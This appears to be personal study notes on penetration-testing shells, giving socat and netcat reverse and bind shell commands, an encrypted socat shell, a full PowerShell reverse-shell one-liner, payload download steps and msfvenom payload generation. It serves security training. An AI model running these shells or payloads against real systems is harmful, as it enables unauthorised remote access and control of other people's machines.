## netcat shell stabilisation
cstrl+c, autocomplet...
### Technique 1:
![[img/Pasted image 20260311012512.png]]
### Technique 2:
`rlwrap nc -lvnp <port>` : rlwrap : autocomplete, history....
`stty raw -echo; fg` : ctrl+c
### Technique 2: Socat (Linux target)
To accomplish this method of stabilisation we would first transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.
##### reverse shell
###### attacker
`socat TCP-L : <port>`
###### target (windows)
`socat TCP:<local-ip>:<local-port> EXEC:powershell.exe,pipes`
###### target (linux)
`socat TCP:<local-ip>:<local-port> EXEC:"bash -li"`
##### bind shell
###### attacker
`socat TCP:<target-ip>:<target-port>`
###### target (windows)
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
###### target (linux)
`socat TCP-L:<port> EXEC:"bash -li"`
#### new trick!
`socat TCP-L:<port> FILE:'tty',raw,echo=0` is like using **Ctrl + Z, `stty raw -echo; fg`** with [[netcat]].
___
`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

| `pty`    | Without this, you don't have a "terminal device." This is what allows you to run commands that require a user interface, like `sudo` (which needs to ask for a password).           |
| -------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `stderr` | In many shells, if a command fails, the error message vanishes into the void. This redirects those errors back to you so you actually know _why_ a command didn't work.             |
| `sigint` | This is the "Safety Net." It ensures that when you hit `Ctrl+C`, the signal goes to the **remote process** (like a hanging `ping`) rather than killing the Socat connection itself. |
| `sane`   | Think of this as a "reset" button. It handles the terminal line discipline—essentially telling the terminal to act like a normal, predictable console.                              |
| `setsid` | Creates the process in a new session                                                                                                                                                |

# Socat encrypted shell
## generate certificate using openssl
### reverse shell
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`: This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year.
`cat shell.key shell.crt > shell.pem`
then we set up our listener: `socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 -`
target:`socat OPENSSL:<local-ip>:<local-port>,verify=0 EXEC:/bin/bash`
### bind shell
attacker: `socat OPENSSL:<target-port>:<target-ip>,verify=0 -`
target: `socat OPENSSL:<port>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
## secure way to listen for bind shell 
**better than netcat -lnvp 80 -e /bin/bash** : modern linux consider it a problem
**sol** → `mkfifo /tmp/f; netcat -lnvp <port> < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f` 
- **0 (stdin):** Standard Input (Keyboard/Input)
- **1 (stdout):** Standard Output (Normal screen text)
- **2 (stderr):** Standard Error (Error messages)
powershell : `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
# msfvenom
**generate windows x64 payload :** `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.11.12.223 LPORT=443`
### staged
1. **The Stager:** A small piece of code executed on the target. Its only job is to "callback" to the attacker.
2. **The Stage:** Once the connection is made, the attacker's listener sends the full exploit code (the "Stage") over the wire. 
3. **Execution:** The stage is executed directly in memory.
### stageless
- The entire binary is sent to the target. 
- Upon execution, it immediately initiates the reverse shell.

## payload naming convention
\<OS>/\<arch>/\<payload>
**example** linux/x86/shell_reverse_tcp
In the above examples the payload used was `shell_reverse_tcp`. This indicates that it was a _stageless_ payload. How? Stageless payloads are denoted with underscores (`_`). The staged equivalent to this payload would be:`shell/reverse_tcp`

## _Meterpreter_  
On the subject of Metasploit, another important thing to discuss is a _Meterpreter_ shell. Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets. They also have a lot of inbuilt functionality of their own, such as file uploads and downloads. If we want to use any of Metasploit's post-exploitation tools then we need to use a meterpreter shell, however, that is a topic for another time. The downside to meterpreter shells is that they _must_ be caught in Metasploit.
___
![[img/Pasted image 20260312173951.png]]
==Metasploit is listening on a port under 1024. To do this, Metasploit _must_ be run with sudo permissions.==



